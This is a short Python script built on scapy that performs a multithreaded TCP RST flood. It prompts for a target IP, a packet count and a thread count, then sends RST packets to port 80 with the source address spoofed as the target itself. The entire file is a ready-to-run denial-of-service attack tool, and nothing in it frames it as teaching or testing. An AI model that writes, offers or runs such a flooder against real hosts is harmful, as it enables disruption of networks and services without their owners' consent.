from scapy.all import *
import os
import threading

def RST_Flood(dstIP, counter):
    for _ in range(counter):
        send(IP(src=dstIP, dst=dstIP)/TCP(dport=80, flags="R"), verbose=0)

def main():
    os.system("clear")
    dstIP = input("\nTarget IP: ")
    counter = int(input("How many packets do you want to send: "))
    threads_count = int(input("How many threads do you want to use: "))

    # 각 쓰레드가 보낼 패킷 수 계산
    packets_per_thread = counter // threads_count
    extra_packets = counter % threads_count

    threads = []

    for i in range(threads_count):
        thread_counter = packets_per_thread + (1 if i < extra_packets else 0)
        thread = threading.Thread(target=RST_Flood, args=(dstIP, thread_counter))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("\nTotal packets sent: %i" % counter)

if __name__ == "__main__":
    main()
